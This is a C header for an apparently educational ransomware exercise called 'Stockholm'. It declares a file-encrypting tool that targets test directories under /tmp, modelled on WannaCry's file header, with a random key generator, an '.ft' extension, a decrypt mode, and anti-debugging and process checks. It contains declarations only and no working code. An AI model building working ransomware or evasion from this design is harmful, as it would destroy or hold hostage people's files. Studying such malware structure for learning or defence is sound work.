#ifndef FA_WOODY_WOODPACKER_H
# define FA_WOODY_WOODPACKER_H

# include <stdio.h>
# include <stdlib.h>
# include <fcntl.h>
# include <unistd.h>
# include <stdint.h>
# include <sys/mman.h>  // For mapping
# include <elf.h>       // For ELF header
# include <string.h>
# include <time.h>      // For rand & srand (encryption key generation)
# include <dirent.h>    // For looping through directory
# include <stdbool.h>

/*-------------------------------- Colors ---------------------------------*/

/* Text colors */
# define FA_RED_COLOR       "\033[31m"
# define FA_GREEN_COLOR     "\033[32m"
# define FA_YELLOW_COLOR    "\033[33m"
# define FA_RESET_COLOR     "\033[0m"

/* Background colors */
# define FA_RESET_BG_COLOR  "\033[49m"

/*------------------------ Defines, enum, struct --------------------------*/

# define FA_TARGET_ARRAY_SIZE   2
// Paths of the target directories
# define FA_TARGET_PATHS        {"/tmp/test/", "/tmp/test2/"}
// Error code
# define FA_ERROR               1
// Length of the key used by the encryptor
# define FA_KEYSTRENGTH         32
// Common value representing the size of a memory page in many computer systems
# define FA_PAGE_SIZE           4096

// Charset used for the encryption key
# define FA_KEYCHARSET          "abcdefghijklmnopqrstuvwxyz" \
                                "ABCDEFGHIJKLMNOPQRSTUVWXYZ" \
                                "0123456789"
// Signature injected in the target files's Stockholm header
# define FA_SIGNATURE           "STOCKHLM"
# define FA_STOCKHLM_EXT        ".ft"

enum fa_e_modes
{
    // Display detailed notifications
    FA_VERBOSE = 1,
    FA_REVERSE = 2
};

enum fa_e_stockhlm_header
{
    FA_NEW_HEADER_SIZE = 0x0118,
    FA_MAGICNBR_LEN = 8,
    FA_AES_ENCRYPT_KEY_LEN = 256
};

// This is the Stockholm header that is written before the original
// header. It has a size of 0x0118 (= 280) bytes.
typedef struct fa_s_stockhlm_header
{
    // 0x0000 WANACRY!
    uint8_t     magicnumber[FA_MAGICNBR_LEN];
    // 0x0008 Length of RSA encrypted data
    uint32_t    encrypted_filesize;

    // 0x000C RSA encrypted AES file encryption key
    // uint8_t encryption_key[FA_AES_ENCRYPT_KEY_LEN];

    // 0x010C File type internal to WannaCry (original file type
    //  of the encrypted file)
    uint32_t    filetype;
    // 0x0110 Original file size
    uint64_t    original_filesize;
    // 0x0118 Encrypted file contents  (AES-128 CBC)
}               fa_t_stockhlm_header;

/*---------------------------- Global variables ---------------------------*/

extern unsigned char    *g_mapped_data; // file is mapped in memory here
extern uint16_t         g_modes;        // options given from command line
extern fa_t_stockhlm_header	stockhlm_header;

/*---------------------------- Function prototypes ------------------------*/

size_t  a_strlen(const char *s);
void    *fa_memset(void *src, int c, size_t n);
void    *fa_memcpy(void *dest, const void *src, size_t n);
int     fa_strncmp(const char *s1, const char *s2, size_t n);
char    *fa_get_filename(char *argv[]);
int     fa_map_file_into_memory(const char *filename);
int     fa_process_mapped_data(void);
int     fa_write_processed_data_to_file(char *target_path);
void    xor_with_additive_cipher(
    void *key, size_t key_length, void *data, size_t data_length, int mode);
char    *fa_keygen(const char *_charset, size_t strength);
void    fa_parse_argv(char *argv[]);
int     pc_is_debugger_attached(void);
int     pc_is_process_running(const char *process_name);

#endif
